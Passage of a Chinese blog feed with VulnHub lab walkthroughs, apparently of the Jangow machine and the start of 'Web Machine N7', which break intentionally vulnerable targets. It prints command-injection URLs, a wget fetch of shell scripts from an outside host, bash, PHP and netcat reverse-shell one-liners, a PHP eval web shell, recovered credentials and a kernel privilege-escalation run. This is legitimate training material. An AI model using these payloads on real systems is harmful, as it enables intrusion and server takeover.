&lt;p&gt;&lt;code&gt;dirsearch -u http://192.168.31.27/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-392.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;gobuster dir -x php,txt,html,zip,rar -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.27/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-393.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 只出现了一个目录 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZQ==&#34;&gt;http://192.168.31.27/site&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-394.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;对这个网站可以点击的地方进行了检查，发现存在下面这个 url 地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9idXNxdWUucGhwP2J1c2Nhcj0=&#34;&gt;http://192.168.31.27/site/busque.php?buscar=&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-395.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;疑似是一个后门文件，尝试进行 rce 注入&lt;/p&gt;
&lt;h3 id=&#34;rce漏洞反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rce漏洞反弹shell&#34;&gt;#&lt;/a&gt; RCE 漏洞反弹 shell&lt;/h3&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-396.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;RCE 漏洞存在，接下来通过这个地方进行反弹 shell，先判断目标服务器是否存在下列可以用来反弹 shell 的命令，可以用 curl bash php 来反弹 shell&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9idXNxdWUucGhwP2J1c2Nhcj13aGljaCUyMGN1cmw7d2hpY2glMjBiYXNoO3doaWNoJTIwcHl0aG9uO3doaWNoJTIwcGhwOw==&#34;&gt;http://192.168.31.27/site/busque.php?buscar=which curl;which bash;which python;which php;&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-397.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;用 wget 来下马，并查看是否将文件下载到了目标服务器上&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9idXNxdWUucGhwP2J1c2Nhcj13Z2V0JTIwaHR0cDovL3d3dy5jaGVudHVvLmFzaWEvc2hlbGwuc2g7bHM=&#34;&gt; http://192.168.31.27/site/busque.php?buscar=wget http://www.chentuo.asia/shell.sh;ls&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-398.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现并没有文件被上传上去&lt;/p&gt;
&lt;h3 id=&#34;rce漏洞绕过方式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rce漏洞绕过方式&#34;&gt;#&lt;/a&gt; RCE 漏洞绕过方式&lt;/h3&gt;
&lt;p&gt;思考是否是因为 sh 脚本的原因，换成 php 文件尝试下载&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9idXNxdWUucGhwP2J1c2Nhcj13Z2V0JTIwaHR0cDovL3d3dy5jaGVudHVvLmFzaWEvc2hlbGwucGhwO2xz&#34;&gt;http://192.168.31.27/site/busque.php?buscar=wget http://www.chentuo.asia/shell.php;ls&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-399.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现 php 文件也无法被上传上去&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;直接通过bash反弹shell 的命令在url地址上执行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -c &amp;#x27;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4444 0&amp;gt;&amp;amp;1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9idXNxdWUucGhwP2J1c2Nhcj1iYXNoJTIwLWMlMjAlMjdiYXNoJTIwLWklMjAlM0UmYW1wOyUyMC9kZXYvdGNwLzE5Mi4xNjguMzEuMTM1LzQ0NDQlMjAwJTNFJmFtcDsxJTI3&#34;&gt;http://192.168.31.27/site/busque.php?buscar=bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4444 0&amp;gt;&amp;amp;1&#39;&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-400.png&#34;&gt;
&lt;p&gt;直接通过 bash 反弹也是失败的，尝试通过 php 的代码来反弹&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;php -r &amp;#x27;$sock=fsockopen(&amp;quot;192.168.31.135&amp;quot;,4444);exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&amp;#x27;http://192.168.31.27/site/busque.php?buscar=php%20-r%20%27$sock=fsockopen(%22192.168.31.135%22,4444);exec(%22/bin/sh%20-i%20%3C&amp;amp;3%20%3E&amp;amp;3%202%3E&amp;amp;3%22);%27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-401.png&#34;&gt;
&lt;p&gt;php 反弹 shell 也被服务器拒绝，下面通过 echo 来给服务器上写文件，看是否能写上文件  &lt;code&gt;echo “1” &amp;gt; 1.php;ls&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9idXNxdWUucGhwP2J1c2Nhcj1lY2hvJTIwJTIyMSUyMiUzRTEucGhwO2xz&#34;&gt;http://192.168.31.27/site/busque.php?buscar=echo &amp;quot;1&amp;quot;&amp;gt;1.php;ls&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-402.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 可以写文件，那么就尝试可以写后门&lt;/p&gt;
&lt;h3 id=&#34;echo-后门至服务器&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#echo-后门至服务器&#34;&gt;#&lt;/a&gt; echo 后门至服务器&lt;/h3&gt;
&lt;p&gt;通过 echo 将 bash 反弹的代码写到目标服务器上&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9idXNxdWUucGhwP2J1c2Nhcj1lY2hv&#34;&gt;http://192.168.31.27/site/busque.php?buscar=echo&lt;/span&gt; “bash -c ‘bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4444 0&amp;gt;&amp;amp;1’” &amp;gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEuc2g=&#34;&gt;1.sh&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-403.png&#34;&gt;
&lt;p&gt;写入失败，页面无反应，看来不能写 sh 文件，还得写 php 文件&lt;/p&gt;
&lt;p&gt;写一个 php 一句话后门，判断是否能写上&lt;/p&gt;
&lt;p&gt;echo ‘&lt;?php @eval($_POST[&#39;x&#39;]); ?&gt;’ &amp;gt;attack.php &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9idXNxdWUucGhwP2J1c2Nhcj1lY2hvJTIwJTI3JTNDP3BocCUyMEBldmFsKCRfUClPU1QlNUIlMjd4JTI3JTVE&#34;&gt;http://192.168.31.27/site/busque.php?buscar=echo &#39;&amp;lt;?php @eval($_P)OST[‘x’]&lt;/span&gt;);%20?%3E%27%20%3E%20attack.php;ls&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-404.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; php 一句话后门写入成功&lt;/p&gt;
&lt;p&gt;查看写的文件是否完整&lt;/p&gt;
&lt;p&gt;view-source:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9idXNxdWUucGhwP2J1c2Nhcj1jYXQlMjBhdHRhY2sucGhw&#34;&gt;http://192.168.31.27/site/busque.php?buscar=cat attack.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-405.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 拿到了网站权限&lt;/p&gt;
&lt;h3 id=&#34;蚁剑突破网站权限&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#蚁剑突破网站权限&#34;&gt;#&lt;/a&gt; 蚁剑突破网站权限&lt;/h3&gt;
&lt;p&gt;通过蚁剑连接到一句话后门的网站&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9hdHRhY2sucGhw&#34;&gt;http://192.168.31.27/site/attack.php&lt;/span&gt; 密码就是 attack.php 文件中的 x&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-406.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;测试连接成功，可以用来连接网站，尔后可以看到服务器上所有的文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-407.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;新建一个 1.php，用来通过php来系统命令反弹shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php system(&amp;quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.31.135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;4444&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;/tmp/f&lt;span class=&#34;string&#34;&gt;&amp;quot;);?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-408.png&#34;&gt;
&lt;p&gt;写入文件成功了，但是没有被执行，并且查看文件发现是空的&lt;/p&gt;
&lt;p&gt;view-source:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS8xLnBocA==&#34;&gt;http://192.168.31.27/site/1.php&lt;/span&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-409.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-410.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;换了多个端口都失败了，最后查阅资料，发现服务器关闭了除 443 以外的端口，监听 443 端口，访问 url 地址，将命令执行等待反弹，访问 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS8xLnBocA==&#34;&gt;http://192.168.31.27/site/1.php&lt;/span&gt; 时，命令被执行，shell 成功反弹&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-411.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 拿到服务器权限&lt;/p&gt;
&lt;h3 id=&#34;翻阅文件突破&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#翻阅文件突破&#34;&gt;#&lt;/a&gt; 翻阅文件突破&lt;/h3&gt;
&lt;p&gt;翻阅网站文件，找到数据库配置文件 config.php，有用户名和密码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-412.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; /var/www/html/site/wordpress/config.php desafio02:abygurl69&lt;/p&gt;
&lt;p&gt;找到一个网站的备份文件，同样有一个用户名和密码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-413.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; /var/www/html/.backup jangow01:abygurl69&lt;/p&gt;
&lt;p&gt;尝试用户名密码登陆，通过 jangow01:abygurl69 登陆成功&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-414.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 获取到 jangow01 权限&lt;/p&gt;
&lt;h3 id=&#34;ftp-上传-exp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ftp-上传-exp&#34;&gt;#&lt;/a&gt; FTP 上传 EXP&lt;/h3&gt;
&lt;p&gt;服务器存在 s 权限的 pkexec，尝试 pkexec 提权，同时收集到服务器版本为 4.4.0-31 ubuntu&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-415.png&#34;&gt;
&lt;p&gt;提前准备好的 pkexec exp 在 kali 上，将其发送至靶机上&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-416.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;kali 开启的 python 简易 web 服务器后无法下载，可能被限制了&lt;br&gt;
而且 ssh 服务并没有启动，用不了 scp 传输文件，并且 ping 不到 kali 机器上&lt;/p&gt;
&lt;p&gt;通过靶机上开放的 ftp 来传输文件，将 CVE-2021-4034 .zip 发送服务器上&lt;br&gt;
通过 jangow01:abygurl69 成功登陆到了 ftp 服务上&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-417.png&#34; width=&#34;430&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发送 CVE-2021-4034 文件时报错，显示不能发送文件夹&lt;/p&gt;
&lt;p&gt;因此改为了发送 CVE-2021-4034.zip 文件&lt;/p&gt;
&lt;p&gt;继续在反弹的 shell 上执行，当编译时，发现没有 make 命令&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-418.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 提权失败，需要通过其他的方式提权&lt;/p&gt;
&lt;h3 id=&#34;searchsploit-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#searchsploit-提权&#34;&gt;#&lt;/a&gt; searchsploit 提权&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;注意到服务器的版本是ubuntu 4.4.0的，用 searchsploit 寻找漏洞&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;searchsploit ubuntu 4.4.0- 31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;searshsploit -x linux/local/45010.c 找到payload的确切位置&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-419.png&#34;&gt;
&lt;p&gt;&lt;code&gt;cp /usr/share/exploitdb/exploits/linux/local/45010.c .&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-420.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;通过 ftp 将内核漏洞权限提升的脚本上传，lcd 可以在 ftp 中用来切换本地的路径，cd 可以在 ftp 中用来切换所属 ftp 服务的主机的目录&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-421.png&#34; width=&#34;410&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;将上传的 45010.c文件编译运行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gcc 45010.c -o exp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod +x exp &amp;amp;&amp;amp; ./exp&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-422.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 提权成功，拿到了 root 权限&lt;/p&gt;
</content>
        <category term="VULNHUB 11-20" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/117%20WEBMACHINE/</id>
        <title>VULNHUB 17 WEBMACHINE</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/117%20WEBMACHINE/"/>
        <content type="html">&lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvd2ViLW1hY2hpbmUtbjcsNzU2Lw==&#34;&gt;https://www.vulnhub.com/entry/web-machine-n7,756/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vd3RodXNreWJsb2cvcC8xNjAyNzk0Ni5odG1s&#34;&gt;https://www.cnblogs.com/wthuskyblog/p/16027946.html&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 WEBMACHINE：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1）arp 确定靶机地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-362.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 目标机器的 ip 地址： 192.168.31.98&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -A -p- 192.168.31.98&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-363.png&#34; width=&#34;350&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 80&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTA5Lw==&#34;&gt;http://192.168.31.109/&lt;/span&gt; 进行信息收集，一个欢迎界面，审查源代码没有什么新发现，先对目标网站进行目录扫描&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-364.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;扫描目录  &lt;code&gt;dirserch -u http://192.168.31.98/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-365.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.98/enter_network -x php,txt,html,zip,rar&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-366.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 识别到了一个敏感目录: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuOTgvZXhwbG9pdC5odG1s&#34;&gt;http://192.168.31.98/exploit.html&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-367.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现一个文件上传漏洞的页面，审查源代码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-368.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;文件上传后，页面会跳转到 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEyNy4wLjAuMS9wcm9maWxlLnBocA==&#34;&gt;http://127.0.0.1/profile.php&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;伪造html界面&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#伪造html界面&#34;&gt;#&lt;/a&gt; 伪造 html 界面&lt;/h3&gt;
&lt;p&gt;伪造一个 html 界面，改变跳转的链接如下，使上传文件的地址到:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuOTgvcHJvZmlsZS5waHA=&#34;&gt;http://192.168.31.98/profile.php&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;开启本地的 python 简易服务器&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-369.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;文件上传漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文件上传漏洞&#34;&gt;#&lt;/a&gt; 文件上传漏洞&lt;/h3&gt;
&lt;p&gt;登陆伪造的 html 界面，点击上传文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-370.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将 kali 自带的 php 反弹 shell 代码修改 ip 和端口号&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-371.png&#34; width=&#34;390&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;点击选择文件，讲 shell.php 文件上传到目标网站&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-372.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;上传完成之后，页面重定向到了 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuOTgvcHJvZmlsZS5waHA=&#34;&gt;http://192.168.31.98/profile.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-373.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 得到了一半的 flag&lt;/p&gt;
&lt;p&gt;目前得到的信息再无可利用的可能，需要更多的信息，但是不管加载多大的字典，都没有扫出来新的目录，通过查相关教程，发现这里隐藏了一个 enter_network 的目录&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-374.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuOTgvZW50ZXJfbmV0d29yaw==&#34;&gt;http://192.168.31.98/enter_network&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;单点登录测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#单点登录测试&#34;&gt;#&lt;/a&gt; 单点登录测试&lt;/h3&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-375.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;注意到这是一个单点登录的地方，可能存在 sql 注入，也有可能会有 xss 漏洞，弱口令登陆等漏洞，这里简单尝试了一下没有发现有弱口令，尝试对这个目录再次进行目录扫描&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-376.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 扫描一个重要的目录: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuOTgvZW50ZXJfbmV0d29yay9hZG1pbi5waHA=&#34;&gt;http://192.168.31.98/enter_network/admin.php&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;修改cookie登陆后台&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#修改cookie登陆后台&#34;&gt;#&lt;/a&gt; 修改 cookie 登陆后台&lt;/h3&gt;
&lt;p&gt;但是此页面只是 admin 的入口，查看网页是否存储了 cookie 的信息&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-377.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;看到这里的角色是一串加密数据，是 base64 加密，其中 %253D 相当于 =&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-378.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;role 解密后的数据是采用的 md5 加密，继续用 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2NtZDUuY29t&#34;&gt;cmd5.com&lt;/span&gt; 解密&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-379.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;user 解密后的数据仍然是一个更加复杂的加密方式，这个加密暂时无法破解&lt;/p&gt;
